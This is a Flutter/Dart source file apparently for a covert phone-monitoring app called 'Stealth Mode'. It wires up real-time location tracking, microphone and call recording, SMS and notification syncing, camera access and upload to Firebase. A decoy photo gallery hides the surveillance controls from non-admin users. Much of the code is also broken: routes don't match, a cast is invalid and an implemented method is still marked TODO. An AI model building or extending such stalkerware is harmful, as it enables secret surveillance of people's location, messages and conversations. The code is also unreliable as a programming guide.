import 'package:flutter/material.dart';
// ignore: unused_import
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:nospyme2/sliders/camera.dart';
import 'package:nospyme2/sliders/envrec.dart';
import 'package:nospyme2/sliders/noti.dart';
import 'package:nospyme2/sliders/realtmloc.dart';
import 'package:nospyme2/sliders/recordmc.dart';
import 'package:nospyme2/sliders/smssync.dart';
import 'package:permission_handler/permission_handler.dart';
import 'dart:async';
import 'package:firebase_auth_web/firebase_auth_web.dart';

class PermissionManager {
  Future<bool> requestPermission(Permission permission) async {
    final status = await permission.status;
    if (status.isDenied) {
      await permission.request();
      final status = await permission.status;
      if (status.isGranted) {
        return true;
      }
    }
    return false;
  }

  Future<bool> hasPermission(Permission permission) async {
    final status = await permission.status;
    return status.isGranted;
  }
}

class FirebaseManager {
  final FirebaseAuth _auth = FirebaseAuth.instance;
  final FirebaseFirestore _firestore = FirebaseFirestore.instance;

  Future<void> sendData(String path, Map<String, dynamic> data) async {
    final user = _auth.currentUser;
    if (user != null) {
      final uid = user.uid;
      final document = _firestore.collection(path).doc(uid);
      document.set(data);
    }
  }
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Stealth Mode',
      onGenerateRoute: (settings) {
        switch (settings.name) {
          case '/real_time_location':
            return MaterialPageRoute(
                builder: (context) => const RealTimeLocationPage());
          case '/recordmc':
            return MaterialPageRoute(
                builder: (context) => const RecordMCPage());
          case '/sms_sync':
            return MaterialPageRoute(builder: (context) => const SMSSyncPage());
          case '/environment_recorder':
            return MaterialPageRoute(builder: (context) => const EnvRecPage());
          case '/camera':
            return MaterialPageRoute(builder: (context) => const CameraPage());
          case '/noti':
            return MaterialPageRoute(builder: (context) => const NotiPage());
          default:
            return null;
        }
      },
    );
  }
}

class App extends StatefulWidget {
  const App({super.key});

  @override
  _AppState createState() => _AppState();
}

class _AppState extends State<App> {
  final PermissionManager _permissionManager = PermissionManager();
  final FirebaseManager _firebaseManager = FirebaseManager();
  final RealTimeLocation _realTimeLocation = RealTimeLocation();
  final CallRecorder _callRecorder = CallRecorder();
  final SMSSync _smsSync = SMSSync();
  final EnvironmentRecorder _environmentRecorder = EnvironmentRecorder();
  final CameraPage _camera = CameraPage();
  final NotiPage _notificationSync = NotiPage();

  _AppState() {
    // Request all permissions
    _permissionManager.requestPermission(Permission.location);
    _permissionManager.requestPermission(Permission.microphone);
    _permissionManager.requestPermission(Permission.sms);
    _permissionManager.requestPermission(Permission.storage);
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Stealth Mode',
      home: Scaffold(
        appBar: AppBar(
          title: Text('Stealth Mode'),
        ),
        body: _buildBody(context),
      ),
    );
  }

  Widget _buildBody(BuildContext context) {
    // Check if the user is an admin.
    UserCredential? currentUser;

    bool isAdmin() {
      // Get the current user.
      final currentUser = FirebaseAuth.instance.currentUser;

      // Check if the user is authenticated.
      if (currentUser == null) {
        return false;
      }

      // Get the UserPlatform class.
      final userPlatform = currentUser as UserPlatform;

      // Check if the user has the admin role.
      if (userPlatform.customClaims != null &&
          userPlatform.customClaims!['admin'] == true) {
        return true;
      } else {
        return false;
      }
    }

    // TODO: Implement this method to check if the user is an admin.
    // If the user is not an admin, return a photo gallery.
    if (!isAdmin()) {
      return PhotoGallery();
    }

    // Return the sliders page.
    return const SlidersPage();
  }
}

class SlidersPage extends StatelessWidget {
  const SlidersPage({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Sliders'),
      ),
      body: ListView(
        children: [
          Card(
            child: ListTile(
              title: Text('Camera'),
              onTap: () => Navigator.pushNamed(context, '/camera'),
            ),
          ),
          Card(
            child: ListTile(
              title: Text('Environment Recorder'),
              onTap: () => Navigator.pushNamed(context, '/envrec'),
            ),
          ),
          Card(
            child: ListTile(
              title: Text('Notification Sync'),
              onTap: () => Navigator.pushNamed(context, '/noti'),
            ),
          ),
          Card(
            child: ListTile(
              title: Text('Real-time Location Tracking'),
              onTap: () => Navigator.pushNamed(context, '/realtmloc'),
            ),
          ),
          Card(
            child: ListTile(
              title: Text('Record Microphone'),
              onTap: () => Navigator.pushNamed(context, '/recordmc'),
            ),
          ),
          Card(
            child: ListTile(
              title: Text('SMS Sync'),
              onTap: () => Navigator.pushNamed(context, '/smssync'),
            ),
          ),
        ],
      ),
    );
  }
}

class PhotoGallery extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Photo Gallery'),
      ),
      body: GridView.builder(
        gridDelegate: SliverGridDelegateWithFixedCrossAxisCount(
          crossAxisCount: 2,
        ),
        itemCount: 100,
        itemBuilder: (context, index) {
          return Image.asset('assets/images/image$index.jpg');
        },
      ),
    );
  }
}
